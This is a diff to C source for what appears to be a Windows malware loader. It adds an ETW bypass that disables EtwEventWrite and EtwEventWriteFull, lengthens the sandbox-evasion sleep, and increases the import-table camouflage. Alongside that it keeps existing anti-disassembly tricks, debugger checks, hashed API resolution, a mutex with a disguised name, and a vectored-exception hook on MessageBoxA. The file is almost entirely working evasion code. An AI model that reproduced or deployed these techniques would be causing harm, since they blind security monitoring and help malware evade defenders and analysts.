@@ -17,6 +17,9 @@
 // Mutant creation
 #include "mutex.h"
 
+// ETW Bypassing
+#include "etw.h"
+
 // Include all typedefs and string hashes
 #include "typedefs.h"
 
@@ -50,13 +53,27 @@ NTAPI_FUNC _G_NTFUNC = { 0 };
 //int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow){
 int main(void) {
 
+	if (DisableETW(ETWEVENTWRITE_HASH) == FALSE || DisableETW(ETWEVENTWRITEFULL_HASH) == FALSE) {
+		return -1;
+	}
+
+#ifdef DEBUG
+	PRINTA("\n[+] Bypassed ETW Successfully !\n\n");
+#endif
+
+	NTSTATUS STATUS = NULL;
+	WCHAR MUTANTNAME[] = { '\\','B','a','s','e','N','a','m','e','d','O','b','j','e','c','t','s','\\','S','M','0',':','4','2','1','2',':','T','I','G','1','2','0',':','W','i','l','E','r','r','o','r','_','0','3', 0x0 };
+	BOOL debugged = FALSE;
+	BOOL MutexRes = FALSE;
+
+	// example: -10000000 = 1sec relative to current :)
+	// Used by NtDelayExecution()
+	LONGLONG sleepTimer = -150000000;
+
 	// Anti-Disassembly
 	AntiDisassmConstantCondition();
 	AntiDisassmAsmJmpSameTarget();
 	AntiDisassmImpossibleDiasassm();
-
-	NTSTATUS STATUS = NULL;
-	WCHAR MUTANTNAME[] = { '\\','B','a','s','e','N','a','m','e','d','O','b','j','e','c','t','s','\\','S','M','0',':','4','2','1','2',':','T','I','G','1','2','0',':','W','i','l','E','r','r','o','r','_','0','3', 0x0 };
 
 	HANDLE hMutant = _CreateMutant(MUTANTNAME);
 	if (hMutant == NULL) {
@@ -64,17 +81,9 @@ int main(void) {
 	}
 
 	// Increase the number for longer operation
-	for (int i = 0; i < 1; i++) {
+	for (int i = 0; i < 3; i++) {
 		camoflage_IAT();
 	}
-
-	BOOL debugged = FALSE;
-
-	// example: -10000000 = 1sec relative to current :)
-	// Used by NtDelayExecution()
-	LONGLONG sleepTimer = -50000000; 
-
-	BOOL MutexRes = FALSE;
 
 	if (AntiDebugPEBCheck() != FALSE) {
 
@@ -113,11 +122,8 @@ int main(void) {
 	PRINTA("[+] Debugger checks -> PASS\n");
 #endif
 
-	t_RtlAddVectoredExceptionHandler RtlAddVectoredExceptionHandler = (t_RtlAddVectoredExceptionHandler)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLADDVECTOREDEXCEPTIONHANDLER_HASH);
-#ifdef DEBUG
-	PRINTA("Addr VectoredExceptionHandler WinAPI -> %p\n", RtlAddVectoredExceptionHandler);
-	//system("pause");
-#endif
+	t_RtlAddVectoredExceptionHandler RtlAddVectoredExceptionHandler = 
+		(t_RtlAddVectoredExceptionHandler)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLADDVECTOREDEXCEPTIONHANDLER_HASH);
 
 	SET_HANDLERINFO((DWORD64)&MessageBoxA, (DWORD64)&hook_MessageBox);
 	PVOID pEhandler = RtlAddVectoredExceptionHandler(1, &e_handler);
